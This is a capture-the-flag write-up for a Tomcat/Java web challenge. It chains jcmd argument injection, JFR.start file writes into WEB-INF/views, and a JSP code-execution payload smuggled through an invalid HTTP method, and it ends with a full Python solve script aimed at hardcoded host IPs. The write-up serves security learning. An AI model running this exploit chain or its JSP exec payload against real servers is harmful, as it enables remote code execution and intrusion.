# web/juice-of-apple-vegetable-apricot

## Overview

This is a Java web challenge. The service is a Tomcat app called `JavaPulse Monitoring`, and the challenge goal is to to make the server run `/readflag`.

Key findings:
1. The app exposes several endpoints that run `jcmd` with user-controlled input.
2. The app also makes Tomcat JSP files under `WEB-INF/views` reachable through normal URLs.
3. The Dockerfile makes that JSP directory writable by the unprivileged app user.
4. Java Flight Recorder (`JFR.start`) can be abused to write a file into that writable JSP directory.
5. An invalid HTTP method lets us smuggle raw JSP code into a Tomcat exception message, which JFR records.
6. Requesting the generated `.jsp` executes the injected JSP expression and runs `/readflag`.

## Exploit Chain

### 1. Find the command injection primitive

The three monitoring servlets all build a shell command with a user-supplied `pid`:

- StatusServlet.java: `jcmd <pid> VM.version`
- HeapServlet.java: `jcmd <pid> GC.heap_info`
- ThreadsServlet.java: `jcmd <pid> Thread.print`

The key code pattern is:

```java
String cmd = "jcmd " + pid + " VM.version";
Process p = Runtime.getRuntime().exec(cmd);
```

Note how `ProcessBuilder` with separated arguments is NOT used here but a single string passed to `exec`, so if we can control `pid`, we can append extra `jcmd` arguments.

### 2. Check what the input validator actually blocks

InputValidator.java blocks obvious shell metacharacters, but it does not block spaces, `.`, `=`, letters, digits, or `/`.

So normal shell injection is not ok. We need to take advantage of tomcat and `jcmd` to do some evil things, which turning `pid=1` into something else like `pid=1 args args args` is enough.

### 3. Find a place where a written file becomes executable

One of those args is `filename=/some/path/out.jsp`. If we can make `jcmd` write a file somewhere, can we reach it through the web app?

Yes. Two files answer that:

- `for_user/src/main/webapp/WEB-INF/web.xml` maps the JSP servlet to `/WEB-INF/views/*`
- `for_user/src/main/webapp/WEB-INF/dispatcher-servlet.xml` maps `/**` to `org.springframework.web.servlet.mvc.UrlFilenameViewController`

That means a request like `/status.jsp` resolves to `/WEB-INF/views/status.jsp`. So if we can write a file into `webapps/ROOT/WEB-INF/views/evil.jsp`, then requesting `/evil.jsp` will cause Tomcat/Jasper to compile and execute it.

### 4. Find a `jcmd` subcommand that can write a file

At this point we need a `jcmd` command that accepts (and write to) a `filename=...`, and works even though the servlet appends a forced trailing token such as `VM.version`.

Sadly, most commands are not useful because the forced tail breaks them. The exception is `JFR.start`.

Why `JFR.start` is special:

- it creates a file at a path we control
- the extra trailing token from the servlet is treated as a warning, not a fatal parse failure
- the file is created after the recording stops, so perhaps a `duration=3s` is helpful to have.

So far, the command is:

```text
pid=1 JFR.start duration=3s filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/x.jsp
```

### 5. Get JSP syntax into the written file

Writing a file is not enough. We need the file contents to contain a JSP expression such as:

```jsp
<%=java.lang.Runtime.getRuntime().exec("/readflag").inputReader().lines().collect(java.util.stream.Collectors.joining("\n"))%>
```

The obvious route, placing that payload inside the `pid` parameter, fails because evil `InputValidator.java` blocks `<`, `>`, `(`, `)`, quotes, braces, and other characters needed for JSP syntax.

So the payload has to come from somewhere else: Tomcat.

Tomcat parses the raw HTTP request line before `InputValidator.java` sees it, and Tomcat's parser rejects invalid characters in the HTTP method and throws an exception like:

```text
Invalid character found in method name [<payload>]. HTTP method names must be tokens
```

And guess what? That the invalid method string itself appears inside the exception message. That gives us a clean input channel that is not filtered by `InputValidator`, because it never goes through a servlet parameter. We can send a raw request with the method set to our JSP payload:

```text
<%=java.lang.Runtime.getRuntime().exec("/readflag").inputReader().lines().collect(java.util.stream.Collectors.joining("\n"))%> /status.jsp HTTP/1.1
Host: target
Connection: close
```

and this will lead to an error message like

```text
Invalid character found in method name [<%=java.lang.Runtime.getRuntime().exec("/readflag").inputReader().lines().collect(java.util.stream.Collectors.joining("\n"))%>]. HTTP method names must be tokens
```

### 6. Make JFR record that exception

How can we get that into the file, tho? Well, JFR can record error messages when told to.

When options `settings=profile exceptions=all` is set, `jcmd` will records the Tomcat exception that contains our invalid HTTP method string into the JFR file. I'm glad that Jasper is not picky, because it takes great effort to pick out the only JSP line from an error message in pool of JFR data.

The full `pid` arg is now:

```text
pid=1 JFR.start duration=3s filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/x.jsp settings=profile exceptions=all
```

### 7. Execute `/readflag` through the injected JSP expression

The final payload I used was:

```jsp
<%=java.lang.Runtime.getRuntime().exec("/readflag").inputReader().lines().collect(java.util.stream.Collectors.joining("\n"))%>
```

When the generated JSP is requested, the response contains a lot of binary-looking JFR content with the evil code being replaced by our lovely flag. The flag can be extracted with:

```regex
Invalid character found in method name \[(.*?)\]\. HTTP method names must be tokens
```

## Final Solve

```python
#!/usr/bin/env python3
import os
import random
import re
import socket
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed


HOSTS = [
    "http://16.184.31.100",
    "http://54.180.254.21",
    "http://3.38.197.202",
    "http://13.125.203.192",
    "http://15.165.234.161",
]

FLAG_RE = re.compile(rb"Invalid character found in method name \[(.*?)\]\. HTTP method names must be tokens", re.S)
VIEW_DIR = "/usr/local/tomcat/webapps/ROOT/WEB-INF/views"
PAYLOAD = '<%=java.lang.Runtime.getRuntime().exec("/readflag").inputReader().lines().collect(java.util.stream.Collectors.joining("\\n"))%>'
STOP = threading.Event()


def http_get(url, timeout=4, method="GET"):
    req = urllib.request.Request(url, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, str(e).encode()


def inject_invalid_method(base_url, method_payload, path="/status.jsp", timeout=3):
    parsed = urllib.parse.urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or 80
    req = (
        f"{method_payload} {path} HTTP/1.1\\r\\n"
        f"Host: {host}\\r\\n"
        "Connection: close\\r\\n"
        "\\r\\n"
    ).encode()
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(req)
            sock.settimeout(timeout)
            chunks = []
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
        return b"".join(chunks)
    except Exception as e:
        return str(e).encode()


def rand_name():
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    return f"f{int(time.time())}{suffix}"


def build_start(pid, filename, duration, endpoint, extra):
    start = f"{pid} JFR.start duration={duration}s filename={filename} {extra}"
    return endpoint, start


def parse_flag(blob):
    m = FLAG_RE.search(blob)
    if not m:
        return None
    try:
        return m.group(1).decode("utf-8", "ignore")
    except Exception:
        return m.group(1).decode("latin-1", "ignore")


def attempt(host, round_id):
    if STOP.is_set():
        return None

    helper_status, helper_body = http_get(f"{host}/api/status?pid=1%20help", timeout=4)
    helper_ok = helper_status == 200 and b"VM.version" in helper_body

    pid = "1"
    if not helper_ok:
        proc_status, proc_body = http_get(f"{host}/api/processes", timeout=4)
        if proc_status == 200:
            for m in re.finditer(rb'"pid":(\\d+),"name":"([^"]+)"', proc_body):
                name = m.group(2)
                if b"org.apache.catalina.startup.Bootstrap" in name or b"jar" in name or b"java" in name:
                    pid = m.group(1).decode()
                    break

    variants = [
        ("/api/status", "settings=profile exceptions=all", 1),
        ("/api/status", "settings=profile exceptions=all", 2),
        ("/api/status", "settings=profile exceptions=all", 3),
        ("/api/status", "settings=default exceptions=all", 1),
        ("/api/status", "settings=default exceptions=all", 2),
        ("/api/heap", "settings=profile exceptions=all", 1),
        ("/api/threads", "settings=profile exceptions=all", 1),
    ]

    for endpoint, extra, duration in variants:
        if STOP.is_set():
            return None

        name = rand_name()
        filename = f"{VIEW_DIR}/{name}.jsp"
        api, start = build_start(pid, filename, duration, endpoint, extra)
        url = f"{host}{api}?pid={urllib.parse.quote(start, safe='')}"
        start_status, _ = http_get(url, timeout=5)

        inject_invalid_method(host, PAYLOAD, path="/status.jsp", timeout=3)
        inject_invalid_method(host, PAYLOAD, path="/status.jsp", timeout=3)
        if STOP.wait(duration + 2):
            return None

        fetch_status, fetch_body = http_get(f"{host}/{name}.jsp", timeout=6)
        flag = parse_flag(fetch_body)
        if flag:
            return {
                "host": host,
                "round": round_id,
                "endpoint": endpoint,
                "duration": duration,
                "start_status": start_status,
                "fetch_status": fetch_status,
                "flag": flag,
            }

        sys.stdout.write(
            f"[round {round_id}] {host} {endpoint} d={duration} start={start_status} fetch={fetch_status} size={len(fetch_body)}\\n"
        )
        sys.stdout.flush()

    return None


def main():
    rounds = int(os.environ.get("ROUNDS", "1000"))
    parallelism = min(len(HOSTS), int(os.environ.get("PARALLELISM", str(len(HOSTS)))))

    for round_id in range(1, rounds + 1):
        with ThreadPoolExecutor(max_workers=parallelism) as pool:
            futures = [pool.submit(attempt, host, round_id) for host in HOSTS]
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    STOP.set()
                    print(result["flag"])
                    print(
                        f"host={result['host']} round={result['round']} endpoint={result['endpoint']} "
                        f"duration={result['duration']} start={result['start_status']} fetch={result['fetch_status']}",
                        file=sys.stderr,
                    )
                    return 0
        time.sleep(1)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Run it with:

```bash
python3 ./solve.py
```
